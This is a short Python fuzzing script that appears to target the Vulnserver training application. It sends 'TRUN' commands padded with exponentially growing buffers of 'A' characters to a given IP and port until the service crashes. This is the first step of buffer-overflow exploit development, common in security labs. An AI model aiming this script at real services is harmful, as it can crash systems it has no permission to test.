#!/usr/bin/python3

import sys
import socket
import time
import argparse
import logging

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def fuzz_target(ip, port):
    buffer_size = 100
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((ip, port))
                payload = f'TRUN /.:/{buffer_size * "A"}'
                logging.info(f'Sending buffer size: {len(payload)}')
                s.sendall(payload.encode())
            time.sleep(1)
            buffer_size *= 2  # Exponential increase in buffer size
        except ConnectionRefusedError:
            logging.error('Connection to target refused. Exiting.')
            sys.exit(1)
        except Exception as e:
            logging.error(f'Fuzzing crashed at {buffer_size} bytes: {e}')
            sys.exit(1)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Simple fuzzer for testing server robustness')
    parser.add_argument('--ip', required=True, help='Target IP address')
    parser.add_argument('--port', type=int, required=True, help='Target port number')
    args = parser.parse_args()

    fuzz_target(args.ip, args.port)
